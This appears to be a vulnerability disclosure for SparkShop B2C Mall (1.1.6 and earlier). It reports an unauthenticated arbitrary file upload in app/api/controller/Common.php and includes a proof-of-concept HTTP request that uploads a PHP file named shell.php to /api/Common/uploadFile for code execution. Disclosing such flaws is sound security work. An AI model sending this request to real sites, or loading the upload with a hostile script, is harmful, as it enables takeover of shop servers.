### BUG_Author:

Rui Jie

### Affected version:

<=1.1.6

### Vendor:

Nanjing Xingyuantu Technology Co. 

SparkShop(Spark Mall) B2C Mall https://www.sparkshop.cn/
### Software:

https://gitee.com/sparkshop/sparkshop


https://github.com/nick-bai/sparkshop

### Vulnerability File:

app/api/controller/Common.php
### Description:
 A vulnerability categorised as critical has been discovered in SparkShop (Spark Mall) B2C Mall. This affects sections of the unauthorised interface file app/api/controller/Common.php. Manipulation of the parameter file results in arbitrary file uploads



![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271558047.png)
And there's no security check on the file upload part
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271559268.png)
We can upload any file via unauthorised api for RCE purposes.


POC
```
POST /api/Common/uploadFile HTTP/1.1
Host: 127.0.0.5
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 166
Content-Type: multipart/form-data; boundary=5f0c1dda2c37ae232c96415ad53dc96b

--5f0c1dda2c37ae232c96415ad53dc96b

Content-Disposition: form-data; name="file"; filename="shell.php"

  

<?=phpinfo();?>

--5f0c1dda2c37ae232c96415ad53dc96b--
```
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121552216.png)

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121557807.png)


We achieved RCE by uploading a malicious php script

